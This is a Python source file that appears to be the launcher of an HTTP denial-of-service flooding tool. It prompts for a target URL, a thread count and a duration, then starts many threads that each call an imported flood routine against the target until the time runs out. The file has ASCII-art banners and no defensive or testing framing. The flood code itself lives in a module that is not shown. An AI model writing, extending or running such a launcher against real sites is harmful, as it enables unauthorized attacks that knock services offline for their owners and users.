import re
import time
import random
import inquirer
from colorama import init, Fore
from threading import Thread
from tools.number_validate import valida_num
from tools.clear import clear
from DoS.http_force import DoSFlooder, run_flood_for_duration
from tools.ascii import Bloody, Delta, Elite, ale, Glenyn, dedo

# Constants
DEFAULT_URL = "example.com.br"
DEFAULT_THREADS = 200
DEFAULT_TIME = 60

init(autoreset=True)

asciis = [Bloody, Delta, Elite, ale, Glenyn]
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW,
          Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

# Function to get user input for URL, threads, and time


def get_user_input():
    while True:
        questions = [
            inquirer.Text('url', message=random.choice(colors) + "URL" + Fore.WHITE,
                          default=DEFAULT_URL,
                          validate=lambda _, x: re.match(r'(https?|ftp):\/\/[^\s/$.?#].[^\s]*', x)),
            inquirer.Text('threads', message=random.choice(colors) + "THREADS" + Fore.WHITE,
                          default=str(DEFAULT_THREADS)),
            inquirer.Text('time', message=random.choice(colors) + "TIME" + Fore.WHITE,
                          default=str(DEFAULT_TIME))
        ]
        answers = inquirer.prompt(questions)

        if valida_num(answers):
            break

        clear()
        print(Fore.RED + dedo +
              "\n\nAre you a fool? THREADS and TIME must be numeric values.\n\n")
        time.sleep(3)
        clear()

    return answers


def main():
    
    print(random.choice(colors) + random.choice(asciis) + "\n")
    print(
        f"url: {DEFAULT_URL}, threads: {DEFAULT_THREADS}, time: {DEFAULT_TIME}\n\n")

    answers = get_user_input()

    target_url = answers['url']
    flooder = DoSFlooder(target_url)
    duration = int(answers['time'])  # Set the duration in seconds

    threads = []
    thread_count = int(answers['threads'])  # Number of threads

    for _ in range(thread_count):
        thread = Thread(target=run_flood_for_duration,
                        args=(flooder, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

    print("All threads have finished.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("BYE!!")
